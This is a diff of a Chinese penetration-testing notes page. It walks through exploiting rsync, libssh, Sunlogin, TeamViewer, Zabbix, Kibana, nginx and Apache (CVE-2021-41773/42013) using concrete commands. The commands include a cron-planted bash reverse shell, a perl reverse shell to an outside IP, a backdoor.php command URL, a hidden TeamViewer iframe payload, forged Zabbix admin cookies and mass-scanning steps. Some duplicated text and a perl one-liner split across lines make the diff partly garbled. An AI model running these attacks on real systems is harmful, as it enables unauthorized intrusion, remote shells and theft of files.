-<p>配置文件错误导致解析漏洞，对于任意文件名，在后面添加 /xxx.php (xxx 为<br>
-任意字符) 后，即可将文件作为 php 解析。如 info.jpg 后面加上 /xxx.php，会将<br>
- info.jpg 以 php 解析。</p>
-<h1 id="httpsvulhuborgenvironmentsnginxnginx_parsing_vulnerability"><a class="markdownIt-Anchor" href="#httpsvulhuborgenvironmentsnginxnginx_parsing_vulnerability">#</a> <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L25naW54X3BhcnNpbmdfdnVsbmVyYWJpbGl0eS8=">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</span></h1>
-<p>CVE- 2013 - 4547 文件名逻辑漏洞，影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~<br>
-1.5.7。抓包，修改为 info.jpg…php, 在 Hex 选修卡中将 jpg 后面的两个点 2e 改成<br>
+<p>漏洞链接：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Qwa3gvZXhwbG9pdC1DVkUtMjAxNS0zMzA2">https://github.com/t0kx/exploit-CVE-2015-3306</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py --host 123.58.236.76 --port 24967 --path &quot;/var/www/html/&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://123.58.236.76:19758/backdoor.php?cmd=<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">遇到这些漏洞时需要自行寻找对应版本的进行漏洞验证</span></span><br></pre></td></tr></table></figure>
+<h4 id="rsync-未授权-rce"><a class="markdownIt-Anchor" href="#rsync-未授权-rce">#</a> rsync 未授权 RCE</h4>
+<p>rsync 是 Linux 下一款数据备份工具，支持通过 rsync 协议、ssh 协议进行远程文件传输。其中 rsync 协议默认监听 873 端口，如果目标开启了 rsync 服务，并且没有配置 ACL 或访问密码，我们将可以读写目标服务器文件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断</span></span><br><span class="line">rsync rsync://123.58.236.76:45854/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取文件</span></span><br><span class="line">rsync rsync://123.58.236.76:45854/src/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载文件</span></span><br><span class="line">rsync rsync://123.58.236.76:45854/src/etc/passwd ./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传文件</span></span><br><span class="line">rsync -av passwd rsync://123.58.236.76:45854/src/tmp/passwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取信息</span></span><br><span class="line">rsync rsync://123.58.236.76:12177/src/etc/crontab /root/cron.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入反弹shell的代码</span></span><br><span class="line">echo -e &quot;#! /bin/bash\nbash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.83/4444 0&gt;&amp;1&#x27;&quot; &gt; /tmp/shell.sh ; chmod +x shell</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传文件</span></span><br><span class="line">rsync -av shell rsync://123.58.236.76:12177/src/etc/cron.hourly</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监听端口等待接受反弹</span></span><br><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+<p><strong>msf 和 fofaviewer 批量测试</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">fofa_viewer: https://github.com/wgpsec/fofa_viewer</span></span><br><span class="line">msfconsole</span><br><span class="line">use auxiliary/scanner/rsync/modules_list</span><br><span class="line">set rhosts file:/root/ips.txt</span><br><span class="line">set threads 10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h4 id="ssh枚举-libssh认证绕过"><a class="markdownIt-Anchor" href="#ssh枚举-libssh认证绕过">#</a> ssh 枚举 libssh 认证绕过</h4>
+<p>（1）SSH 协议漏洞:</p>
+<p>CVE-2014-0160 版本很少，都被修复了；CVE_2020_15778 价值不高。</p>
+<p>OpenSSH 8.3p1 及之前版本中的 scp 的 scp.c 文件存在操作系统命令注入漏洞。该漏洞即使在禁用 ssh 登录的情况下，但是允许使用 scp 传文件，而且远程服务器允许使用反引号 (`)，可利用 scp 复制文件到远程服务器时，执行带有 payload 的 scp 命令，从而在后续利用中 getshell。需要漏洞版本 &lt;= openssh-8.3p1，作用是通过 scp 来连接已知用户名密码的系统。</p>
+<p>CVE-2018-15473 - 用户名枚举</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/Rhynorater/CVE-2018-15473-Exploit</span></span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">pip3 install paramiko==2.4.1</span><br><span class="line">python sshUsernameEnum.py --port 32013 --userList exampleInput.txt 123.58.236.76 作用是通过字典来判断对方 ssh 有没有与这个字典里匹配的用户名。</span><br></pre></td></tr></table></figure>
+<p>（2）libssh 服务端权限认证绕过漏洞 (CVE-2018-10933)<br>
+ libssh 是一个提供 ssh 相关接口的开源库，包含服务端、客户端等。其服务 端代码中存在一处逻辑错误，攻击者可以在认证成功前发送 MSG_USERAUTH _SUCCESS 消息，绕过认证过程，未授权访问目标 SSH 服务器。</p>
+<p>环境启动后，我们可以连接 your-ip:2222 端口 (账号密码: myuser:mypassword)，这是一个合法的 ssh 流程。参考 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy8=">https://www.seebug.org/</span><br>
+vuldb/ssvid-97614 中给出的 POC，使用 python3 执行，即可在目标服务器上 RCE。</p>
+<p>漏洞链接:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIvbGlic3NoL0NWRS0yMDE4LTEwOTMzL1JFQURNRS56aC1jbi5tZA==">https://github.com/vulhub/vulhub/blob/master/libssh/CVE-2018-10933/README.zh-cn.md</span></p>
+<h4 id="向日葵rce-vnc口令"><a class="markdownIt-Anchor" href="#向日葵rce-vnc口令">#</a> 向日葵 RCE、vnc 口令</h4>
+<p>（1）向日葵 RCE：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/Mr-xn/sunlogin_rce</span></span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t scan</span><br><span class="line">xrkRce.exe -h 192.168.46.157 -t rce -p 49712 -c &quot;ipconfig&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扫描到端口后，针对特定版本进行命令执行操作，可直接反弹shell；可利用nc或者powershell或者其他目标上存在的程序进行反弹shell</span></span><br></pre></td></tr></table></figure>
+<p>（2）VNC 口令问题：</p>
+<p>可能未设置密码导致的未授权访问，也可以通过 msf 猜解密码爆破 vnc</p>
+<h4 id="teamviewer-xss攻击"><a class="markdownIt-Anchor" href="#teamviewer-xss攻击">#</a> teamviewer xss 攻击</h4>
+<p>通过网页调用除了命令执行，可以执行任意命令，配合 XSS 或者钓鱼使用，当发现对方是特定版本的 teamviewer 时，诱使对方访问构造好的 url 链接。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span> cve-2020-13699 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span> Welcome to xiaodi! <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">&quot;height:1px;width:1px;&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;teamviewer10: --play \\attacker-IP\share\fake.tvs&#x27;</span> &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="zabbix-未授权-rce"><a class="markdownIt-Anchor" href="#zabbix-未授权-rce">#</a> zabbix 未授权 rce</h4>
+<p>Zabbix 是由 Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。是一款服务器监控软件，其由 server、agent、web 等模块组 成，其中 web 模块由 PHP 编写，用来显示数据库中的结果。默认端口：10051。</p>
+<p>漏洞复现 fofa 关键字:app=“ZABBIX - 监控系统” &amp;&amp; body=“saml”</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击脚本:https://github.com/L0ading-x/cve-2022-23131</span> </span><br><span class="line">python3 cve-2022-23131.py http://127.0.0.1 Admin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将生成的 zbx_signed_session 替换到当前目标的 cookie 中，点击登陆页面的 sign <span class="keyword">in</span> with Single Sign-On (SAML)方式登陆，即可直接进入管理界面!</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手动复现：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">捕获的原来的cookie的值如下</span></span><br><span class="line">zbx_session=eyJzZXNzaW9uaWQiOiJlNWNjNjc2ZWUzNDRlNGU4ZWIzNxxxxsIxxxxxxxx xMa1lYYXBucWp0RXpMdTFmTVJPcTArOGtxbkFLemdIMTdxUlY1VnErSkpKUGVaZHE3 WG02aGtQd1wvWUxycDgrYXgzbEQ4RjF6ajlRVENHelE9PSJ9</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行base 64 解码后的结果为</span></span><br><span class="line">&#123;&quot;sessionid&quot;:&quot;e5cc676ee3xxe8eb3790b521&quot;,&quot;sign&quot;:&quot;9Fv7yJLkYXapnqjtEzLu1fMROq0+8kqnAKzgH17qRV5Vxxx7Xm6hkPw\/YLrp8+ax3lD8F1zj9QTCGzQ==&quot;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加Admin用户到cookie中</span></span><br><span class="line">&#123;&quot;saml_data&quot;:&#123;&quot;username_attribute&quot;:&quot;Admin&quot;&#125;,&#123;&quot;sessionid&quot;:&quot;e5cc6xxxx4e4e8eb3790b521&quot;,&quot;sign&quot;:&quot;9Fv7yJLkYXapnqjtEzLu1fMRxxxZdq7Xm6hkPw\/YLrp8+ax3lD8F1zj9QTCGzQ==&quot;&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次编码后伪造cookie发送</span></span><br><span class="line">eyJzYW1sX2RhdGEiOnsidxxxxjoiQWRtaW4ifSx7InNlc3Npb25pZCI6ImU1Y2M2NzZlZTM 0MDQ4NDM2NGU0ZThlYjM3OTBiNTIxIiwic2lnbiI6IjlGdjd5SkxrWVhhcG5xanRFekx1M WZNUk9xMCs4a3FuQUt6Z0gxN3FSVjVWcStKSkpQZVpkcTdYbTZoa1B3XC9ZTHJwOCt heDNsRDhGMXpqOVFUQ0d6UT09In0=</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">zabbix可以写入一些script脚本并且执行此脚本的操作的，从后台的未授权直接突破到服务器的权限，再根据服务器的漏洞进行提权</span></span><br></pre></td></tr></table></figure>
+<h4 id="kibana-任意代码执行"><a class="markdownIt-Anchor" href="#kibana-任意代码执行">#</a> Kibana 任意代码执行</h4>
+<p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其 5.6.15 和 6.6.1 之前 的版本中存在一处原型链污染漏洞，利用漏洞可以在目标服务器上执行任意代码。默认端口：5601</p>
+<p>攻击脚本:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xhbmRHcmV5L0NWRS0yMDE5LTc2MDk=">https://github.com/LandGrey/CVE-2019-7609</span><br>
+ 复现链接:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Z1bGh1Yi92dWxodWIvYmxvYi9tYXN0ZXIva2liYW5hL0NWRS0yMDE5LTc2MDkvUkVBRE1FLnpoLWNuLm1k">https://github.com/vulhub/vulhub/blob/master/kibana/CVE-2019-7609/README.zh-cn.md</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">原型链污染发生在“Timeline”页面，我们填入如下 Payload:</span></span><br><span class="line">.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;/bin/touch /tmp/success&quot;);process.exit()//&#x27;)</span><br><span class="line">.props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">成功后再访问“Canvas”页面触发命令/bin/touch /tmp/success，文件成功创建</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以配合py脚本和Fofaviewer批量搜索目标测试漏洞：</span></span><br></pre></td></tr></table></figure>
+<h3 id="中间件安全"><a class="markdownIt-Anchor" href="#中间件安全">#</a> 中间件安全</h3>
+<h4 id="nginx-文件解析"><a class="markdownIt-Anchor" href="#nginx-文件解析">#</a> nginx 文件解析</h4>
+<p>配置文件错误导致解析漏洞，对于任意文件名，在后面添加 /xxx.php (xxx 为任意字符) 后，即可将文件作为 php 解析。如 info.jpg 后面加上 /xxx.php，会将 info.jpg 以 php 解析。</p>
+<p>复现链接:<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L25naW54X3BhcnNpbmdfdnVsbmVyYWJpbGl0eS8=">https://vulhub.org/#/environments/nginx/nginx_parsing_vulnerability/</span></p>
+<p>CVE-2013-4547:<span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L0NWRS0yMDEzLTQ1NDcv">https://vulhub.org/#/environments/nginx/CVE-2013-4547/</span><br>
+CVE-2013-4547 文件名逻辑漏洞，影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7。抓包，修改为 info.jpg…php, 在 Hex 选修卡中将 jpg 后面的两个点 2e 改成<br>
  20,00。寻找上传点，并且确定版本合适可测试该漏洞。</p>
-<h1 id="httpsvulhuborgenvironmentsnginxcve-"><a class="markdownIt-Anchor" href="#httpsvulhuborgenvironmentsnginxcve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL25naW54L0NWRS0=">https://vulhub.org/#/environments/nginx/CVE-</span> 2013 - 4547/</h1>
-<p>CVE_2021_23017 无 EXP，没有可以直接拿权限的代码<br>
- CVE_2017_7529 信息泄漏意义不大</p>
-<h4 id="332-apache-rce-目录遍历-文件解析"><a class="markdownIt-Anchor" href="#332-apache-rce-目录遍历-文件解析">#</a> 3.3.2 apache RCE、目录遍历、文件解析</h4>
-<h5 id="1-cve-2021-41773"><a class="markdownIt-Anchor" href="#1-cve-2021-41773">#</a> （ 1 ）CVE- 2021 - 41773</h5>
-<p>Apache HTTP Server 目录遍历漏洞 CVE- 2021 - 41773 ，影响版本：Apache<br>
-HTTP Server 2.4.49，该漏洞是由于 Apache HTTP Server 2.4.49 版本存在目录穿<br>
-越漏洞，攻击者利用该漏洞在未授权的情况下，访问服务器未在 httpd 配置文件<br>
-中标记为拒绝请求的文件内容，进而导致敏感信息泄露。</p>
-<p>复现地址：# <span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI5MzE3Mi5odG1s">https://www.freebuf.com/articles/web/293172.html</span><br>
-curl -s --path-as-is “<span class="exturl" data-url="aHR0cDovL2lwOjgwODAvaWNvbnMvLiUyZS8lMmUlMmUvJTJlJTJlLyUyZSUyZS9ldGMvcGFzc3dk">http://ip:8080/icons/../../../../etc/passwd</span>”<br>
-curl -s --path-as-is -d ‘echo Content-Type: text/plain; echo;whoami’ “<span class="exturl" data-url="aHR0cDovL2lwOjgwODAvY2dpLQ==">http://ip:8080/cgi-</span><br>
-bin/.%2e/%2e%2e/%2e%2e/bin/sh”<br>
-curl -s --path-as-is -d 'echo Content-Type: text/plain; echo;perl -e ‘use<br>
-Socket;<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mn>47.94.236.117</mn><mi mathvariant="normal">&quot;</mi><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">i=&quot;47.94.236.117&quot;;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">&quot;</span><span class="mord">4</span><span class="mord">7</span><span class="mord">.</span><span class="mord">9</span><span class="mord">4</span><span class="mord">.</span><span class="mord">2</span><span class="mord">3</span><span class="mord">6</span><span class="mord">.</span><span class="mord">1</span><span class="mord">1</span><span class="mord">7</span><span class="mord">&quot;</span><span class="mpunct">;</span></span></span></span>p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tc<br>
-p”));if(connect(S,sockaddr_in(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo separator="true">,</mo><mi>i</mi><mi>n</mi><mi>e</mi><msub><mi>t</mi><mi>a</mi></msub><mi>t</mi><mi>o</mi><mi>n</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">p,inet_aton(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">t</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mopen">(</span></span></span></span>i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;)<br>
-;open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};’</p>
-<ul>
-<li>此为 perl 语言生成的反弹 shell 命令，可通过棱角社区直接生成</li>
-</ul>
-<p>（ 2 ）CVE- 2021 - 42013</p>
-<p>Apache HTTP Server 目录遍历漏洞 CVE- 2021 - 42013 影响版本：Apache HTTP</p>
-<p>Server 2.4.50 &amp; Apache HTTP Server 2.4.49，该漏洞是由于在 Apache HTTP Server<br>
-2.4.50 版本中对 CVE- 2021 - 41773 修复不够完善，攻击者可利用该漏洞绕过修复<br>
-补丁，并利用目录穿越攻击访问服务器中一些文件，进而造成敏感信息泄露。<br>
-若 httpd 中开启 CGI 功能，攻击者可以构造恶意请求，造成远程代码执行。</p>
-<p>参考地址：# <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIyMjkxNTYy">https://blog.csdn.net/weixin_47306547/article/details/122291562</span><br>
-curl -v --path-as-is <span class="exturl" data-url="aHR0cDovL0lQOjgwODAvaWNvbnMvLiUyNSUzMiU2NS8uJTI1JTMyJTY1Ly4lMjUlMzIlNjUvLiUyNSUzMiUyNTY=">http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6</span><br>
-5/.%%32%65/.%%32%65/.%%32%65/etc/passwd<br>
-curl -v --data “echo;id” ‘<span class="exturl" data-url="aHR0cDovL0lQOjgwODAvY2dpLWJpbi8uJTI1JTMyJTY1Ly4lMjUlMzIlNjU=">http://IP:8080/cgi-bin/.%2e/.%2e</span><br>
-/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh’</p>
-<h1 id="工具地址httpsgithubcominbug-teamcve-2021-41773_cve-2021-42013"><a class="markdownIt-Anchor" href="#工具地址httpsgithubcominbug-teamcve-2021-41773_cve-2021-42013">#</a> 工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2luYnVnLXRlYW0vQ1ZFLQ==">https://github.com/inbug-team/CVE-</span> 2021 - 41773_CVE- 2021 - 42013</h1>
-<ul>
-<li>CVE- 2021 - 41773 cve- 2021 - 42013 的主要区别把 /%2e / 换成了 /.%%32%65 / 从而绕过了<br>
- Apache HTTP Server 2.4.50 的补丁</li>
-</ul>
-<p>（ 3 ）CVE- 2017 - 15715</p>
-<p>apache CVE- 2017 - 15715 文件解析：Apache HTTPD 是一款 HTTP 服务器。<br>
-其 2.4.0~2.4.29 版本存在一个解析漏洞，在解析 PHP 时，1.php\x0A 将被按照<br>
+<p>CVE_2021_23017 无 EXP，没有可以直接拿权限的代码</p>
+<p>CVE_2017_7529 信息泄漏意义不大</p>
+<h4 id="apache-文件解析-rce"><a class="markdownIt-Anchor" href="#apache-文件解析-rce">#</a> apache 文件解析 rce</h4>
+<p>(1)CVE-2021-41773</p>
+<p>Apache HTTP Server 目录遍历漏洞 CVE-2021-41773，影响版本：Apache HTTP Server 2.4.49，该漏洞是由于 Apache HTTP Server 2.4.49 版本存在目录穿 越漏洞，攻击者利用该漏洞在未授权的情况下，访问服务器未在 httpd 配置文件中标记为拒绝请求的文件内容，进而导致敏感信息泄露。</p>
+<p>漏洞链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI5MzE3Mi5odG1s">https://www.freebuf.com/articles/web/293172.html</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问并下载</span></span><br><span class="line">curl -s --path-as-is &quot;http://ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd&quot;</span><br><span class="line">curl -s --path-as-is -d &#x27;echo Content-Type: text/plain; echo;whoami&#x27; &quot;http://ip:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh&quot;</span><br><span class="line">curl -s --path-as-is -d &#x27;echo Content-Type: text/plain; echo;perl -e &#x27;use</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">此为perl语言生成的反弹shell命令，可通过棱角社区直接生成</span></span><br><span class="line">Socket;$i=&quot;47.94.236.117&quot;;$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;</span><br></pre></td></tr></table></figure>
+<p>（2）CVE-2021-42013</p>
+<p>Apache HTTP Server 目录遍历漏洞 CVE-2021-42013 影响版本：Apache HTTP</p>
+<p>Server 2.4.50 &amp; Apache HTTP Server 2.4.49，该漏洞是由于在 Apache HTTP Server 2.4.50 版本中对 CVE-2021-41773 修复不够完善，攻击者可利用该漏洞绕过修复 补丁，并利用目录穿越攻击访问服务器中一些文件，进而造成敏感信息泄露。 若 httpd 中开启 CGI 功能，攻击者可以构造恶意请求，造成远程代码执行。</p>
+<p>参考地址：# <span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NzMwNjU0Ny9hcnRpY2xlL2RldGFpbHMvMTIyMjkxNTYy">https://blog.csdn.net/weixin_47306547/article/details/122291562</span></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">工具地址：https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</span></span><br><span class="line">curl -v --path-as-is [http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6](http://IP:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%6)5/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br><span class="line">curl -v --data &quot;echo;id&quot; &#x27;http://IP:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CVE-2021-41773 cve-2021-42013 的主要区别把 /%2e/换成了/.%%32%65/从而绕过了Apache HTTP Server 2.4.50 的补丁</span></span><br></pre></td></tr></table></figure>
+<p>（3）CVE-2017-15715</p>
+<p>apache CVE-2017-15715 文件解析：Apache HTTPD 是一款 HTTP 服务器。 其 2.4.0~2.4.29 版本存在一个解析漏洞，在解析 PHP 时，1.php\x0A 将被按照<br>
  PHP 后缀进行解析，导致绕过一些服务器的安全策略。</p>
-<h1 id="httpsvulhuborgenvironmentshttpdcve-"><a class="markdownIt-Anchor" href="#httpsvulhuborgenvironmentshttpdcve-">#</a> <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2h0dHBkL0NWRS0=">https://vulhub.org/#/environments/httpd/CVE-</span> 2017 - 15715/</h1>
-<p>在 1.php 后面插入一个 \x0A（注意，不能是 \x0D\x0A，只能是一个 \x0A）， 不 再 拦 截<br>
-访问刚才上传的 / 1.php%0a，发现能够成功解析，但这个文件不是 php 后缀，说明目标存<br>
+<p>漏洞链接: <span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL2h0dHBkL0NWRS0yMDE3LTE1NzE1Lw==">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</span></p>
